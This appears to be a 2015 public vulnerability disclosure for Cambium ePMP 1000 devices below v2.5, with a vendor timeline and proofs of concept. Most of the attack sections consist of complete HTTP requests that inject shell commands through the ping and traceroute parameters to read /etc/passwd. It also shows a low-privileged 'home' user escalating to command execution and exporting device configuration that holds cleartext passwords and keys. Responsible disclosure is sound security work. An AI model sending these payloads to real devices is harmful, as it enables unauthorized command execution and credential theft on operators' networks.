@@ -1,0 +1,390 @@
+*July 14, 2015: *First contacted Cambium
+
+*July 14, 2015: *Initial vendor response
+
+*July 16, 2015: *Vuln Details reported to Cambium
+
+*July 31, 2015:* Followup on advisory and fix timelines
+
+*August 03, 2015: *Vendor gives mid-Aug as fix (v2.5) release
+timeline. Ceases communication.
+
+*Nov 19, 2015: *Releasing vulnerability details & poc
+
+
+*Versions affected*: < v2.5
+
+
+.....
+
+*CVE-IDs* - To be assigned.
+
+.....
+
+
+*Background *
+
+http://www.cambiumnetworks.com/products/access/epmp-1000/
+
+
+
+ePMP™ 1000
+Wireless service providers and enterprises need reliable, high-quality
+broadband connectivity that can be rapidly deployed and expanded. The
+ePMP platform provides stable coverage across large service areas and
+enhances your existing infrastructure.
+
+
+*Deployed by:*
+
+
+ION Telecom
+Kayse Wireless
+Vanilla Telecom
+Traeger Park
+EszakNet
+Edera
+Videon
+COMeSER
+Seattle, WA
+Budapest Video Surveillance
+Desktop
+Silo Wireless
+Rocket Broadband
+Snavely Forest Products
+KRK Sistemi
+KAJA Komputer
+Root Media
+
+
+*Vulnerability Details*
+
+*From Cambium Networks ePMP 1000 user / configuration guide:
+*
+ePMP 1000 has four (4) users -
+
+- ADMINISTRATOR, who has full read and write permissions.
+- INSTALLER, who has permissions to read and write parameters
+applicable to unit installation and monitoring.
+- HOME, who has permissions only to access pertinent information for
+support purposes
+- READONLY, who only has permissions to view the Monitor page.
+
+
+.....
+
+1. *OS Command Injection *
+
+'admin' and 'installer' users have access to perform Ping and
+Traceroute functions via GUI. No other user has this access.
+
+Ping function accepts destination IP address value via 'ping_ip
+parameter and uses three (3) other parameters - packets_num, buf_size
+and ttl, to perform Ping.
+
+Traceroute function accepts destination IP address via 'traceroute_ip'
+parameter.
+
+The application does not perform strict input validation for all these
+parameters - ping_ip', packets_num, buf_size and ttl for Ping
+function; and traceroute_ip for Traceroute function.
+
+This allows an authenticated user - 'admin' or non-admin,
+low-privileged 'installer' & ‘home’ users - to be able to inject
+arbitrary system commands that gets executed by the host.
+
+.....
+*PING PoC *
+
+.....
+HTTP Request
+.....
+
+POST /cgi-bin/luci/;stok=<stok_value>/admin/ping HTTP/1.1
+Host: <IP_address>
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:38.0)
+Gecko/20100101 Firefox/38.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://<IP_address>/
+Cookie: sysauth=<sysauth_value>;
+globalParams=%7B%22dashboard%22%3A%7B%22refresh_rate%22%3A%225%22%7D%2C%22installer%22%3A%7B%22refresh_rate%22%3A%225%22%7D%7D;
+userType=Installer; usernameType=installer; stok=<stok_value>
+DNT: 1
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+ping_ip=8.8.8.8|cat%20/etc/passwd%20||&packets_num=1&buf_size=1&ttl=1&debug=0
+
+[
+*or*
+
+ping_ip=8.8.8.8&packets_num=1|cat%20/etc/passwd%20||&buf_size=1&ttl=1&debug=0
+*or*
+
+ping_ip=8.8.8.8&packets_num=1&buf_size=1|cat%20/etc/passwd%20||&ttl=1&debug=0
+*or*
+
+ping_ip=8.8.8.8&packets_num=1&buf_size=1&ttl=1|cat%20/etc/passwd%20||&debug=0
+]
+
+
+.....
+HTTP Response
+.....
+
+HTTP/1.1 200 OK
+Cache-Control: no-store, no-cache, max-age=0, must-revalidate,
+post-check=0, pre-check=0
+Cache-Control: no-cache
+Status: 200 OK
+Content-Type: text/plain
+Expires: 0
+Date: Sun, 18 Jan 1970 14:45:37 GMT
+Server: Cambium HTTP Server
+
+daemon:*:1:1:daemon:/var:/bin/false
+ftp:*:55:55:ftp:/home/ftp:/bin/false
+network:*:101:101:network:/var:/bin/false
+admin:<password_hash>:1000:4:admin:/tmp:/usr/bin/clish
+installer:<password_hash>:2000:100:installer:/tmp:/bin/false
+home:<password_hash>:3000:100:home:/tmp:/bin/false
+readonly:<password_hash>:4000:100:readonly:/tmp:/bin/false
+dashboard:<password_hash>:5000:100:dashboard:/tmp:/bin/false
+nobody:*:65534:65534:nobody:/var:/bin/false
+root:<password_hash>:0:0:root:/root:/bin/ash
+
+
+.....
+*traceroute - PoC
+*
+.....
+HTTP Request
+.....
+
+POST /cgi-bin/luci/;stok=<stok_value>/admin/traceroute HTTP/1.1
+Host: <IP_address>
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:38.0)
+Gecko/20100101 Firefox/38.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://<IP_address>/
+Cookie: sysauth=<sysauth_value>;
+globalParams=%7B%22dashboard%22%3A%7B%22refresh_rate%22%3A%225%22%7D%2C%22installer%22%3A%7B%22refresh_rate%22%3A%225%22%7D%7D;
+userType=Installer; usernameType=installer; stok=<stok_value>
+DNT: 1
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+traceroute_ip=8.8.8.8|cat%20/etc/passwd%20||&fragm=0&trace_method=icmp_echo&display_ttl=0&verbose=0&debug=0
+
+.....
+HTTP Response
+.....
+
+HTTP/1.1 200 OK
+Cache-Control: no-store, no-cache, max-age=0, must-revalidate,
+post-check=0, pre-check=0
+Cache-Control: no-cache
+Status: 200 OK
+Content-Type: text/plain
+Expires: 0
+Date: Sun, 18 Jan 1970 16:09:26 GMT
+Server: Cambium HTTP Server
+
+daemon:*:1:1:daemon:/var:/bin/false
+ftp:*:55:55:ftp:/home/ftp:/bin/false
+network:*:101:101:network:/var:/bin/false
+admin:<password_hash>:1000:4:admin:/tmp:/usr/bin/clish
+installer:<password_hash>:2000:100:installer:/tmp:/bin/false
+home:<password_hash>:3000:100:home:/tmp:/bin/false
+readonly:<password_hash>:4000:100:readonly:/tmp:/bin/false
+dashboard:<password_hash>:5000:100:dashboard:/tmp:/bin/false
+nobody:*:65534:65534:nobody:/var:/bin/false
+root:<password_hash>:0:0:root:/root:/bin/ash
+
+
+.....
+
+2. *Weak Authorization Controls + privilege escalation*
+
+'home' and 'readonly' users do not have access to Ping and Traceroute
+functions via management portal. However, the application lacks strict
+authorization controls, and we can still perform both these functions
+by sending corresponding HTTP(S) requests directly, when logged in as
+low-privileged, 'home' user.
+
+When we combine this flaw with above described OS Command Injection
+affecting ping and traceroute, it is possible for non-admin,
+low-privileged, ‘home’ user to execute system level commands via
+'ping' and 'traceroute' functions and dump password hashes easily and
+/ or perform any system level functions.
+*Note*: ‘readonly’ user cannot perform this. Only ‘home’ user can
+exploit these.
+
+.....
+*Steps to attack -
+*
+a login as home user
+b craft & send HTTP request for ping and traceroute functions
+
+.....
+Login - HTTP Request
+..
+
+POST /cgi-bin/luci HTTP/1.1
+Host: <IP_address>
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:38.0)
+Gecko/20100101 Firefox/38.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://<IP_address>/
+Cookie: sysauth=<sysauth_value>;
+globalParams=%7B%22dashboard%22%3A%7B%22refresh_rate%22%3A%225%22%7D%2C%22installer%22%3A%7B%22refresh_rate%22%3A%225%22%7D%7D
+DNT: 1
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+username=home&password=<password>
+
+
+.....
+Login - HTTP Response
+..
+
+
+HTTP/1.1 200 OK
+Cache-Control: no-store, no-cache, max-age=0, must-revalidate,
+post-check=0, pre-check=0
+Cache-Control: no-cache
+Status: 200 OK
+Set-Cookie: sysauth=<home-sysauth_value>;
+path=/cgi-bin/luci/;stok=<home-stok-value>
+Content-Type: application/json
+Expires: 0
+Date: Sun, 18 Jan 1970 16:40:50 GMT
+Server: Cambium HTTP Server
+
+{ "stok": <home-stok_value>", "certif_dir": "/tmp/new_certificates/",
+"status_url": "/cgi-bin/luci/;stok=<home-stok_value>/admin/status }
+
+
+..
+*Sending HTTP request for Ping function
+*
+.....
+HTTP Request
+.....
+
+POST /cgi-bin/luci/;stok=<home-stok_value>/admin/ping HTTP/1.1
+Host: <IP_address>
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:38.0)
+Gecko/20100101 Firefox/38.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://<IP_address>/
+Cookie: sysauth=<home-sysauth_value>;
+globalParams=%7B%22dashboard%22%3A%7B%22refresh_rate%22%3A%225%22%7D%2C%22installer%22%3A%7B%22refresh_rate%22%3A%225%22%7D%7D;
+userType=Home User; usernameType=home; stok=<home-stok_value>
+DNT: 1
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+ping_ip=8.8.8.8|cat%20/etc/passwd%20||&packets_num=1&buf_size=1&ttl=1&debug=0
+
+.....
+HTTP Response
+.....
+
+HTTP/1.1 200 OK
+Cache-Control: no-store, no-cache, max-age=0, must-revalidate,
+post-check=0, pre-check=0
+Cache-Control: no-cache
+Status: 200 OK
+Content-Type: text/plain
+Expires: 0
+Date: Sun, 18 Jan 1970 14:45:37 GMT
+Server: Cambium HTTP Server
+
+daemon:*:1:1:daemon:/var:/bin/false
+ftp:*:55:55:ftp:/home/ftp:/bin/false
+network:*:101:101:network:/var:/bin/false
+admin:<password_hash>:1000:4:admin:/tmp:/usr/bin/clish
+installer:<password_hash>:2000:100:installer:/tmp:/bin/false
+home:<password_hash>:3000:100:home:/tmp:/bin/false
+readonly:<password_hash>:4000:100:readonly:/tmp:/bin/false
+dashboard:<password_hash>:5000:100:dashboard:/tmp:/bin/false
+nobody:*:65534:65534:nobody:/var:/bin/false
+root:<password_hash>:0:0:root:/root:/bin/ash
+
+..
+
+Similarly, Traceroute function can be exploited.
+
+......................................................................................................................................................
+
+3. *Weak Authorization Controls + Information Disclosure*
+
+In addition to 'admin', only 'installer' user has the option to access
+device configuration. ‘home’ user does not have GUI option and should
+not be able to access / download device configuration. However, the
+application lacks strict authorization measures and the low-privileged
+'home' user can gain unauthorized access to the device configuration
+simply by requesting it.
+*Configuration backup export* can be performed by directly accessing
+the following url:
+*http://<IP_address>/cgi-bin/luci/;stok=<homeuser-stok_value>/admin/config_export?opts=json
+*
+Upon a successful config export, full device configuration with
+clear-text passwords, usernames, keys, IP addresses, statistics, logs
+etc is downloaded.
+
+HTTP/1.1 200 OK
+Cache-Control: no-store, no-cache, max-age=0, must-revalidate,
+post-check=0, pre-check=0
+Cache-Control: no-cache
+Status: 200 OK
+Content-Type: application/json
+Content-Disposition: attachment; filename=<filename>.json
+Expires: 0
+Date: Sun, 18 Jan 1970 16:50:21 GMT
+Server: Cambium HTTP Server
+
+{
+"template_props":
+{
+"templateName":"",
+"templateDescription":"",
+"device_type":"",
+
+…
+<output - snipped>
+…
+}
+
+.....
+
+
+Best Regards,
+
+Karn Ganeshen
+
+-- 
+Best Regards,
+Karn Ganeshen
